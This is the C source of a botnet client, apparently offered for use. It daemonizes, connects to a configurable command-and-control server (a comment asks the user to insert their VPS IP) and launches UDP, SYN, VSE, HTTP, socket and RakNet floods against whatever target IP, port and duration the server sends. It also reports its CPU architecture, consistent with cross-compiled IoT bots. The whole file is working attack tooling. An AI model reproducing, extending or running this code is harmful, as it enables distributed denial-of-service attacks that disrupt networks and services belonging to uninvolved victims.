#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include "syn_attack.h"
#include "udp_attack.h"
#include "http_attack.h"
#include "socket_attack.h"
#include "vse_attack.h"
#include "raknet_attack.h"
#include "attack_params.h"
#include "daemon.h"

#define CNC_IP "0.0.0.0" // YOUR VPS IP HERE/IP VPS GẮN Ở ĐÂY
#define BOT_PORT 1338
#define MAX_THREADS 1

const char* get_arch() {
    #if defined(__aarch64__)
    return "aarch64";
    #elif defined(__arm__)
    return "arm";
    #elif defined(__m68k__)
    return "m68k";
    #elif defined(__mips__)
    return "mips";
    #elif defined(__mipsel__)
    return "mipsel";
    #elif defined(__powerpc64__)
    return "powerpc64";
    #elif defined(__sh__)
    return "sh4";
    #elif defined(__sparc__)
    return "sparc";
    #elif defined(__x86_64__)
    return "x86_64";
    #elif defined(__i386__)
    return "i686";
    #else
    return "unknown";
    #endif
}

void handle_command(const char *command, int sock) {
    static attack_params* params = NULL;
    static pthread_t threads[MAX_THREADS];
    const char* arch = get_arch();

    if (strcmp(command, "ping") == 0) {
        char buffer[256];
        snprintf(buffer, sizeof(buffer), "pong %s", arch);
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    // Supported attacks
    int is_attack = 0;
    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet"};
    int method_len[] = {4, 4, 4, 7, 5, 7};
    int which = -1;
    for (int i = 0; i < 6; i++) {
        if (strncmp(command, methods[i], method_len[i]) == 0) {
            is_attack = 1;
            which = i;
            break;
        }
    }

    if (is_attack) {
        char ip[32] = {0};
        int port = 0, time = 0;
        int psize = 0, srcport = 0;
        char argstr[512] = {0};

        // Parse command and optional arguments
        int n = sscanf(command, "%*s %31s %d %d %[^\n]", ip, &port, &time, argstr);

        if (n < 3) return; // Not enough arguments

        // Parse optional arguments
        if (n == 4 && strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) {
                    psize = atoi(token + 6);
                } else if (strncmp(token, "srcport=", 8) == 0) {
                    srcport = atoi(token + 8);
                }
                token = strtok(NULL, " ");
            }
        }

        if (params != NULL) {
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
        }
        params = malloc(sizeof(attack_params));
        memset(params, 0, sizeof(attack_params));
        params->target_addr.sin_family = AF_INET;
        params->target_addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &params->target_addr.sin_addr);
        params->duration = time;
        params->active = 1;
        params->psize = psize;
        params->srcport = srcport;

        void* (*attack_func)(void*) = NULL;
        switch (which) {
            case 0: attack_func = udp_attack; break;
            case 1: attack_func = vse_attack; break;
            case 2: attack_func = syn_attack; break;
            case 3: attack_func = socket_attack; break;
            case 4: attack_func = http_attack; break;
            case 5: attack_func = raknet_attack; break;
        }
        for (int i = 0; i < MAX_THREADS; i++) {
            pthread_create(&threads[i], NULL, attack_func, params);
        }
        sleep(time);
        params->active = 0;
        for (int i = 0; i < MAX_THREADS; i++) {
            pthread_cancel(threads[i]);
        }
        free(params);
        params = NULL;
        return;
    }

    if (strcmp(command, "stop") == 0) {
        if (params != NULL) {
            params->active = 0;
            for (int i = 0; i < MAX_THREADS; i++) {
                pthread_cancel(threads[i]);
            }
            free(params);
            params = NULL;
        }
        return;
    }
}

int main(int argc, char** argv) {
    daemonize(argc, argv);

    int sock;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);

    int attempts = 0;
    while (attempts < 8) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            return 1;
        }

        int optval = 1;
        if (setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval)) < 0) {
            close(sock);
            return 1;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            attempts++;
            sleep(5);
            continue;
        }

        attempts = 0;

        char buffer[1024];
        while (1) {
            memset(buffer, 0, sizeof(buffer));
            int len = recv(sock, buffer, sizeof(buffer), 0);
            if (len <= 0) {
                close(sock);
                break;
            }
            handle_command(buffer, sock);
        }
    }

    close(sock);
    return 0;
}
